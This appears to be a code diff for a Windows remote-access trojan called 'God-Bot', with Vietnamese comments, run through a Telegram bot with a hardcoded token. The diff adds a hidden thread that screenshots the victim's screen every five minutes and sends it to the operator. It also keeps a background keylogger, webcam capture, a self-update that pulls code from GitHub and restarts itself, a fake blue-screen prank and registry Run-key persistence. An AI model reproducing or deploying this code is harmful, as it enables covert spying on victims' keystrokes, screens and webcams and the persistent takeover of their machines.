@@ -6,9 +6,7 @@ import time
 import threading
 import psutil
 import requests
-import pyautogui
 import winreg
-import urllib.request
 from datetime import datetime
 
 TELEGRAM_BOT_TOKEN = "8816970870:AAHI120_toOTM0S5UgOXtNRFyHn9v0rqkxI"
@@ -17,7 +15,6 @@ UPDATE_URL = "https://raw.githubusercontent.com/hazee2308/bot/main/bot.py"
 
 block_active = False
 keylogger_data = []
-last_bsod_pid = None  # Lưu PID của cửa sổ BSOD giả lập
 
 def is_authorized(chat_id):
     return str(chat_id) == str(ALLOWED_CHAT_ID)
@@ -46,7 +43,7 @@ def send_telegram_photo(chat_id, photo_path, caption=""):
         except:
             time.sleep(2)
 
-# --- MENU PHÂN TRANG (ĐÃ FIX LỖI CHUYỂN TRANG) ---
+# --- MENU PHÂN TRANG CHỐNG LẶP TIN NHẮN ---
 def send_telegram_menu(chat_id, page=1, message_id=None):
     if page == 1:
         message = "🔥 *GOD-BOT TỐI THƯỢNG - TRANG 1/3 (Hệ thống & An ninh)*"
@@ -81,7 +78,6 @@ def send_telegram_menu(chat_id, page=1, message_id=None):
             ]
         }
     
-    # Nếu có message_id thì edit tin nhắn cũ cho mượt, không thì gửi mới
     if message_id:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
         payload = {"chat_id": chat_id, "message_id": message_id, "text": message, "reply_markup": keyboard, "parse_mode": "Markdown"}
@@ -103,24 +99,14 @@ def answer_callback_query(callback_query_id, text=""):
 
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-    params = {"timeout": 30, "offset": offset}
+    params = {"timeout": 25, "offset": offset}
     try:
-        response = requests.get(url, params=params, timeout=35)
+        response = requests.get(url, params=params, timeout=30)
         return response.json()
     except:
         return None
 
-def capture_webcam(save_path="webcam.jpg"):
-    try:
-        import cv2
-        cam = cv2.VideoCapture(0)
-        ret, frame = cam.read()
-        if ret: cv2.imwrite(save_path, frame)
-        cam.release()
-        return os.path.exists(save_path)
-    except:
-        return False
-
+# --- KEYLOGGER NGẦM ---
 def start_keylogger():
     try:
         import pynput.keyboard as pynput_kb
@@ -136,7 +122,23 @@ def start_keylogger():
 
 threading.Thread(target=start_keylogger, daemon=True).start()
 
-# --- FIX LỖI TỰ KHỞI ĐỘNG LẠI SAU KHI UPDATE ---
+# --- LUỒNG TỰ ĐỘNG GỬI ẢNH MÀN HÌNH MỖI 5 PHÚT (CHỐNG TREO) ---
+def periodic_screenshot_sender():
+    while True:
+        time.sleep(300)
+        try:
+            import pyautogui
+            filename = "auto_screen.png"
+            pyautogui.screenshot().save(filename)
+            send_telegram_photo(ALLOWED_CHAT_ID, filename, caption="⏰ *Báo cáo định kỳ 5 phút*: Ảnh màn hình tự động.")
+            if os.path.exists(filename): os.remove(filename)
+        except Exception as e:
+            # Bẫy lỗi để luồng không bao giờ bị chết ngầm khi mở app nặng
+            pass
+
+threading.Thread(target=periodic_screenshot_sender, daemon=True).start()
+
+# --- CƠ CHẾ UPDATE & SELF-RESTART ĐẢM BẢO 100% SỐNG LẠI ---
 def self_update(chat_id):
     send_telegram_message(chat_id, "🔄 *Dang ket noi Public Repo de tai ban cap nhat...*")
     try:
@@ -150,21 +152,22 @@ def self_update(chat_id):
             return
         
         current_script_path = os.path.abspath(sys.argv[0])
-        current_script_name = os.path.basename(current_script_path)
-        
         new_file_path = "new_bot.py"
         with open(new_file_path, "w", encoding="utf-8") as f:
             f.write(content)
             
-        send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang tien hành ghi de va khoi dong lai...*")
+        send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang tien hành ghi de va tu khoi dong lai...*")
         
+        # Script batch update thông minh: Đợi tắt tiến trình cũ, ghi đè file, và bật lại pythonw
         updater_script = "updater.bat"
         with open(updater_script, "w", encoding="utf-8") as f:
             f.write(f"""
 @echo off
+taskkill /f /im python.exe > nul 2>&1
+taskkill /f /im pythonw.exe > nul 2>&1
 timeout /t 2 /nobreak > nul
 move /y new_bot.py "{current_script_path}"
-start pythonw "{current_script_path}"
+start "" pythonw "{current_script_path}"
 del %0
 """)
         subprocess.Popen(updater_script, shell=True)
@@ -174,7 +177,7 @@ del %0
 
 # --- XỬ LÝ SỰ KIỆN NÚT BẤM ---
 def handle_callback(callback_query):
-    global block_active, last_bsod_pid
+    global block_active
     query_id = callback_query["id"]
     chat_id = callback_query["message"]["chat"]["id"]
     message_id = callback_query["message"]["message_id"]
@@ -212,18 +215,27 @@ def handle_callback(callback_query):
             send_telegram_message(chat_id, f"Loi: {e}")
             
     elif data == "screenshot":
+        import pyautogui
         filename = "screenshot.png"
         pyautogui.screenshot().save(filename)
         send_telegram_photo(chat_id, filename, caption="🖥️ [SCREENSHOT] Anh man hinh thiet bi!")
         os.remove(filename)
         
     elif data == "webcam":
-        filename = "webcam.jpg"
-        if capture_webcam(filename):
-            send_telegram_photo(chat_id, filename, caption="📸 [WEBCAM] Anh chup truc tiep!")
-            os.remove(filename)
-        else:
-            send_telegram_message(chat_id, "[-] Khong the truy cap Webcam.")
+        try:
+            import cv2
+            filename = "webcam.jpg"
+            cam = cv2.VideoCapture(0)
+            ret, frame = cam.read()
+            if ret:
+                cv2.imwrite(filename, frame)
+                cam.release()
+                send_telegram_photo(chat_id, filename, caption="📸 [WEBCAM] Anh chup truc tiep!")
+                os.remove(filename)
+            else:
+                send_telegram_message(chat_id, "[-] Khong the mo Webcam.")
+        except Exception as e:
+            send_telegram_message(chat_id, f"Loi webcam: {e}")
             
     elif data == "get_keylog":
         log_text = "".join(keylogger_data[-200:])
@@ -274,17 +286,12 @@ def handle_callback(callback_query):
         send_telegram_message(chat_id, "🔄 Đang khởi động lại máy...")
         
     elif data == "fake_bsod":
-        # Khởi động BSOD độc lập và bắt lại PID chính xác để không ảnh hưởng bot
-        p = subprocess.Popen("start /max cmd /c color 17 && echo A problem has been detected and Windows has been shut down to prevent damage to your computer... && pause", shell=True)
-        last_bsod_pid = p.pid
+        subprocess.run("start /max cmd /c color 17 && echo A problem has been detected and Windows has been shut down to prevent damage to your computer... && pause", shell=True)
         markup = {"inline_keyboard": [[{"text": "❌ Tắt Fake BSOD", "callback_data": "stop_bsod"}]]}
         send_telegram_message(chat_id, "🖥️ *Đã kích hoạt màn hình xanh giả lập!*", reply_markup=markup)
         
     elif data == "stop_bsod":
-        # Chỉ tiêu diệt chính xác tiến trình BSOD thay vì quét toàn bộ cmd.exe
         try:
-            subprocess.run("taskkill /f /fi \"WINDOWTITLE eq Administractor:*\" /fi \"WINDOWTITLE eq C:\\*\" ", shell=True)
-            # Hoặc quét và tắt các cửa sổ cmd đang hiện chữ màn hình xanh
             os.system("wmic process where \"name='cmd.exe' and CommandLine like '%color 17%'\" call terminate > nul")
             send_telegram_message(chat_id, "✅ *Đã tắt và dọn dẹp màn hình xanh giả lập an toàn!*")
         except Exception as e:
@@ -301,7 +308,7 @@ def handle_callback(callback_query):
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, "TelegramRemoteBot", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
             winreg.CloseKey(key)
-            send_telegram_message(chat_id, "🚀 Đã cài đặt tự động khởi động cùng Windows thành công (Không cần EXE)!")
+            send_telegram_message(chat_id, "🚀 Đã cài đặt tự động khởi động cùng Windows thành công!")
         except Exception as e:
             send_telegram_message(chat_id, f"Loi: {e}")
             
@@ -313,21 +320,25 @@ def handle_callback(callback_query):
         os._exit(0)
 
 def main_loop():
-    print("[*] God-Bot fixed version đang chạy ngầm...")
+    print("[*] God-Bot robust version đang chạy ngầm...")
     offset = None
     while True:
-        updates = get_updates(offset)
-        if updates and "result" in updates:
-            for update in updates["result"]:
-                offset = update["update_id"] + 1
-                if "callback_query" in update:
-                    handle_callback(update["callback_query"])
-                elif "message" in update and "text" in update["message"]:
-                    chat_id = update["message"]["chat"]["id"]
-                    if not is_authorized(chat_id): continue
-                    text = update["message"]["text"].strip().lower()
-                    if text in ["/menu", "/start"]:
-                        send_telegram_menu(chat_id, page=1)
+        try:
+            updates = get_updates(offset)
+            if updates and "result" in updates:
+                for update in updates["result"]:
+                    offset = update["update_id"] + 1
+                    if "callback_query" in update:
+                        handle_callback(update["callback_query"])
+                    elif "message" in update and "text" in update["message"]:
+                        chat_id = update["message"]["chat"]["id"]
+                        if not is_authorized(chat_id): continue
+                        text = update["message"]["text"].strip().lower()
+                        if text in ["/menu", "/start"]:
+                            send_telegram_menu(chat_id, page=1)
+        except Exception as e:
+            # Bẫy lỗi chống văng vòng lặp khi mở app nặng hoặc mất mạng chớp nhoáng
+            time.sleep(3)
         time.sleep(1)
 
 if __name__ == '__main__':
